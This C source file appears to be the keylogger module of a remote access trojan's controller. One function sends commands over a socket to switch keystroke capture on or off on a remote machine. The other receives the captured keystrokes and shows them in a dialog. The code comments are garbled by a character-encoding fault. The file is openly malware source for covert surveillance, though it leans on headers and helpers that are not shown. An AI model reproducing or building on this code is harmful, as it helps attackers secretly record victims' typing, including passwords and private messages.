#include "KeyBoard.h"


HWND hKeyDlg = NULL;

//���Ϳ�����رռ��̼������
BOOL KeyCmdSend(SOCKET sockfd,HWND hDlg,BOOL flag)
{
	hKeyDlg = hDlg;
	RatProto ratPro;
	if (flag)
	{
		ratPro.RatId = KEY_OK;
	}
	else
	{
		ratPro.RatId = KEY_CANCEL;
	}
	ratPro.RatLen = sizeof(RatProto);

	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));

	return TRUE;
}

//���ռ��̼�¼�����ֻ�����뽹��ı�ʱ�Żᷢ�ͷ���
BOOL KeyReply(SOCKET sockfd,int dwRecvSize)
{
	int dwSize = ((RatProto*)szRecvCmd)->RatLen - sizeof(RatProto);
	if (dwSize)
	{
		char* pData = szRecvCmd+sizeof(RatProto);
		SetDlgItemText(hKeyDlg,IDC_EDIT1,pData);
	}


	return TRUE;
}